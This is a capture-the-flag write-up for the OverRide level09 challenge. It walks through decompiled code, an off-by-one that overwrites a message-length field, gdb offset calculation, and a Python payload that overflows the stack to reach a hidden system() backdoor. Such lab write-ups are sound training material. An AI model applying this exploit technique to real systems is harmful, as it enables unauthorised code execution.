level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: test
>: Msg sent!

First test it seems like the program is asking us our username and a message, nothing special.
But using dogbolt, a new non used function appear:

int secret_backdoor()
{
  char s[128];

  fgets(s, 128, 0);
  return system(s);
}

So by using our 2 input, username and message we want to overwrite eip and launch secret_backdoor.

Looking at the code we see something weird:
for ( i = 0; i <= 40 && s[i]; ++i )
	var->username[i] = s[i];

username has a size of 40 but this loop is writing in username 41 times, meaning we can overwrite the next value.
Using dog bolt or gdb we understand that the code has the following structure:

typedef struct			s_struct
{
  char  message[140];
	char  username[40];
	int   message_lenght;
}						t_struct;

So we should in theory overwrite message_length, lets look at it on the stack:

run <<< $(python -c "print('A' * 40 + '\xBB')")
x/50x $rbp
0x7fffffffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe5b0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe5c0:	0x41414141	0x000000bb

Just after the array of 40 (filled with A in our case) we have our message length.
This mean we can use this to do a bufferoverflow on the next function:
char *set_msg(t_struct *var)
{
  char s[1024];

  memset(s, 0, sizeof(s));
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets(s, 1024, 0);
  return strncpy(var->message, s, var->message_lenght);
}

var->message is a char of size 140 so we have to find a length bigger than that. FF is the biggest we can do:
run <<< $(python -c "print('A' * 40 + '\xFF')")
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) 

We segfault because we have written on eip, but message array was empty so its just 0.
Lets add a value to our message array. 
We want to launch secret_backdoor so lets use this adress:'\x8c\x48\x55\x55\x55\x55'
We need to find the good value for message length so we calculate the padding between the start of the tab and eip:
0x7fffffffe510:	0x90909090
(gdb) i f
 Saved registers:
  rbp at 0x7fffffffe5d0, rip at 0x7fffffffe5d8
(gdb) p/d 0x7fffffffe5d8 - 0x7fffffffe510
$3 = 200

The value is 200.

We will do the following:
Enter 40 junk char to fill username and overwrite message length with '\xCE' (200 + 6 for the adress).
Than we put 200 junk to fill the tab all the way to eip, and finally put the adress of secret backdoor.

python -c "print('A' * 40 + '\xCE' + '\n' + '\x90' * 200 + '\x8c\x48\x55\x55\x55\x55')" > /tmp/test
level09@OverRide:~$ cat /tmp/test - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end